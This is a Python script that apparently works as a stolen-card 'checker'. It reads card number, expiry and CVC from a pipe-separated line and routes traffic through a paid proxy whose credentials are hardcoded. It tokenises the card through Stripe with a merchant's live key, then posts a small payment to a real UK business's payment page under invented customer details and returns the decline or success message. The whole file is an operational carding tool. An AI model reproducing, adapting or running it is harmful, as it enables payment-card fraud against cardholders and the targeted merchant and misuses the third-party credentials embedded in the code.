import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "bd.porterproxies.com:8888:user-PP_FBBG3PY7GO-country-US-plan-luminati:nsugwlie"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4914722127%3B+stripe-js-v3%2F4914722127%3B+card-element&key=pk_live_E5f060A5v9NKGpVxT6RHGRaU'
	
	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'www.bgm.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.bgm.co.uk',
	    'referer': 'https://www.bgm.co.uk/pay',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'ACT': '97',
	}
	
	data = {
	    'XID': '8acd981c6fb3e49b476f48f620aa5944ad4a31a4',
	    'ret': '%2Fpay%2Fsuccess',
	    'ret_error': 'https%3A%2F%2Fwww.bgm.co.uk%2Fpay',
	    'P': 'usb9Flt2SuUp6NTp89L1S7SIkX+Cf2WzJ1KB5VEmIUHYQB7x2eA3GwO8i0CUvxlAU2oVj3FsCGzTEZe155EHvVwTA7S/6MnobQK1bGseTSzUZcf30kreaQjA4e/HY5IwGQ3aS1iSYACapSmvyqglWjhEusqd/0g+ZclUHm60YeU4hQYbW++BUamIVzXDxM2zTA2QBkgMlnGkDPlbgQlnfYpuHR5sP7vnFCWYtqpV5uHGsgjhSlPJAXVlTnksfSV5+LqxUueuzP1/nRiE7kE7kSsKiBs7wPak+8whiuP6LXY2N9s7RHyxCM9wSoiQOfLl',
	    'customer_name': 'Rodam User',
	    'meta:company': 'NA',
	    'customer_email': 'rodamuser08@gmail.com',
	    'meta:telephone': '4303000850',
	    'meta:reference': '1',
	    'card_name': 'Dao Khao Saard',
	    'plan_amount': '1',
	    'meta:privacy': 'Yes',
	    'card_token': f'{pm}',
	}
	
	response = session.post('https://www.bgm.co.uk/', params=params, headers=headers, data=data)
	
	try:
		result = re.search(r'"errors":"(.*?)"', response.text).group(1)
	except:
		result = re.search(r'"verb":"(.*?)"', response.text).group(1)
		
	return (result)
